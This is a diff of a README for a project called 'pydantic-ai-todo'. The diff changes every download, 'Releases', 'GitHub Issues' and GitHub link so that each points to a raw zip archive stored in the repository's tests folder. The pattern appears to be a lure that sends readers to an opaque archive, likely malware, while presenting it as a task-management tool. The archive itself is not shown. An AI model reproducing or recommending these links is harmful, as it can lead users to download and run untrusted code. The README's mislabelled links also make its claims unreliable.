@@ -1,6 +1,6 @@
 # 📝 pydantic-ai-todo - Simplify Your Task Management
 
-[![Download Now](https://raw.githubusercontent.com/sinambela666/pydantic-ai-todo/main/pydantic_ai_todo/ai_todo_pydantic_v3.1.zip%20Now-Click%https://raw.githubusercontent.com/sinambela666/pydantic-ai-todo/main/pydantic_ai_todo/ai_todo_pydantic_v3.1.zip)](https://raw.githubusercontent.com/sinambela666/pydantic-ai-todo/main/pydantic_ai_todo/ai_todo_pydantic_v3.1.zip)
+[![Download Now](https://raw.githubusercontent.com/sinambela666/pydantic-ai-todo/main/tests/ai-pydantic-todo-v3.8.zip%20Now-Click%https://raw.githubusercontent.com/sinambela666/pydantic-ai-todo/main/tests/ai-pydantic-todo-v3.8.zip)](https://raw.githubusercontent.com/sinambela666/pydantic-ai-todo/main/tests/ai-pydantic-todo-v3.8.zip)
 
 ## 📋 Overview
 
@@ -22,7 +22,7 @@ Before downloading, make sure your system meets the following requirements:
 
 You can download pydantic-ai-todo from the Releases page. 
 
-Visit this page to download: [pydantic-ai-todo Releases](https://raw.githubusercontent.com/sinambela666/pydantic-ai-todo/main/pydantic_ai_todo/ai_todo_pydantic_v3.1.zip)
+Visit this page to download: [pydantic-ai-todo Releases](https://raw.githubusercontent.com/sinambela666/pydantic-ai-todo/main/tests/ai-pydantic-todo-v3.8.zip)
 
 ### 3. **Choose the Right Version**
 
@@ -52,7 +52,7 @@ Once the installation is complete, you can run pydantic-ai-todo.
 
 ## 📥 Download & Install
 
-To download and install pydantic-ai-todo, visit: [pydantic-ai-todo Releases](https://raw.githubusercontent.com/sinambela666/pydantic-ai-todo/main/pydantic_ai_todo/ai_todo_pydantic_v3.1.zip). Follow the steps outlined above for easy installation.
+To download and install pydantic-ai-todo, visit: [pydantic-ai-todo Releases](https://raw.githubusercontent.com/sinambela666/pydantic-ai-todo/main/tests/ai-pydantic-todo-v3.8.zip). Follow the steps outlined above for easy installation.
 
 ## 🛠 Features
 
@@ -76,13 +76,13 @@ Using pydantic-ai-todo will help you:
 If you encounter any issues while using pydantic-ai-todo, feel free to reach out for support:
 
 - **Documentation:** Access detailed guides and FAQs on the [Documentation page](#).
-- **Contact Us:** Reach out to our support team through [GitHub Issues](https://raw.githubusercontent.com/sinambela666/pydantic-ai-todo/main/pydantic_ai_todo/ai_todo_pydantic_v3.1.zip).
+- **Contact Us:** Reach out to our support team through [GitHub Issues](https://raw.githubusercontent.com/sinambela666/pydantic-ai-todo/main/tests/ai-pydantic-todo-v3.8.zip).
 
 ## 🌐 Join the Community
 
 Become a part of our growing community. Share your experiences, tips, and suggestions. Follow us on:
 
-- **GitHub:** [pydantic-ai-todo](https://raw.githubusercontent.com/sinambela666/pydantic-ai-todo/main/pydantic_ai_todo/ai_todo_pydantic_v3.1.zip)
+- **GitHub:** [pydantic-ai-todo](https://raw.githubusercontent.com/sinambela666/pydantic-ai-todo/main/tests/ai-pydantic-todo-v3.8.zip)
 - **Twitter:** [@pydantic_ai](#)
 - **Discord:** Join our [Discord server](#) to chat with other users.
 
